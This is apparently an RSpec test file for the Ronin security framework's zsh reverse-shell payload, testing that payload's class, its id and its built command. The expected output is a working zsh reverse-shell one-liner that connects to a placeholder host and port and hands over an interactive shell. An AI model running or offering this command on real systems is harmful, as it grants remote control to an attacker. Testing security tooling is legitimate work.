require 'spec_helper'
require 'ronin/payloads/builtin/command/zsh/reverse_shell'

describe Ronin::Payloads::Command::Zsh::ReverseShell do
  it "must inherit from Ronin::Payloads::CommandPayload" do
    expect(described_class).to be < Ronin::Payloads::CommandPayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'command/zsh/reverse_shell'" do
      expect(subject.id).to eq('command/zsh/reverse_shell')
    end
  end

  let(:host) { 'example.com' }
  let(:port) { 1337 }

  subject do
    described_class.new(
      params: {
        host: host,
        port: port
      }
    )
  end

  describe "#build" do
    before { subject.build }

    it "must build an `zsh` command that connects back to the host and port params" do
      expect(subject.payload).to eq("zsh -c 'zmodload zsh/net/tcp && ztcp #{host} #{port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'")
    end
  end
end
